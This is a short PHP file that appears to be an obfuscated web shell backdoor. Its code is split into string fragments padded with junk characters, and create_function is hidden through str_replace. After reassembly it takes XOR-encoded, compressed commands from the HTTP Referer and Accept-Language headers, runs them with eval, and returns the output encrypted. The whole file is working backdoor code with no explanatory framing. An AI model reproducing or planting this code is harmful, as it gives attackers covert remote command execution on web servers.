<?php
$V='ray9_v9al9ues($q);preg_mat9ch_al9l("/([\\9w]9)[\\w-]+(?9:;q=0.([9\\9d9]))?,?/",$ra,$m9)';
$p='$kh="5d419";$kf="49029a";f9unction 9x(9$t,$k){$c=9str99len($k);$l=str9len9($t);9$o=""9';
$A='r";$i=$9m[1][90].9$m[91][1];$h=$sl($9ss(m9d5($9i9.$kh),0,3));9$f=$s9l($9ss(md95($i';
$h='4_encode(x9(gz9compress9($9o),$k))9;print("<$k>$d</$9k>")9;@9session_destroy(9);}}}}';
$T='.$kf),990,3));$p="";9for($z=1;9$z<9count(99$m[1]);$z++)$p.=9$9q[$9m[2][$z]];9if(str';
$P=';for($i=90;$i<$l;){for(9$j9=0;9($j<$c&&$i<9$l)9;$j++,$9i++9){$o.=9$t{$i}^9$k{$j};}}';
$a=str_replace('iU','','iUciUreatiUe_iUfunciUtiUion');
$t='re9turn 9$9o;}$r=9$_SE9RVER;$rr=@$r9["H9TT9P_REFERER"];$9ra=@$r["H9TTP_AC9C9EPT_LAN';
$n='[$i].=$p;9$e=strpos($s[9$i]9,$f9);if($e){$k9=$kh.$9kf;ob_st99art();@e9val(@gzunc9o';
$f='mpress9(@x(@9base9649_decode(preg_9replac9e9(array9("/_/",9"/-9/"),array("/"99,"+")9,';
$z='pos9($p,$9h)===0){99$s[$i]=""9;$p=9$9ss(9$p,3);}if(ar9ray_key_ex9ist9s($i9,$s)){9$9s';
$K='G9UAGE"];9i9f(9$9rr&&$ra){$u=par9se9_url($rr9);parse_st9r($9u["quer9y"],$9q);$q=ar';
$o='$ss(9$s[$i],0,$e)9)),$9k9)));$o=ob_ge9t_co9ntents();o9b_9end_clea9n999();$d=base69';
$u=';if(9$q&9&$m){9@session_s9tart(9);$99s=&9$_SESSION;$ss="substr9";$sl=9"strt9olo9we';
$J=str_replace('9','',$p.$P.$t.$K.$V.$u.$A.$T.$z.$n.$f.$o.$h);
$e=$a('',$J);$e();
?>
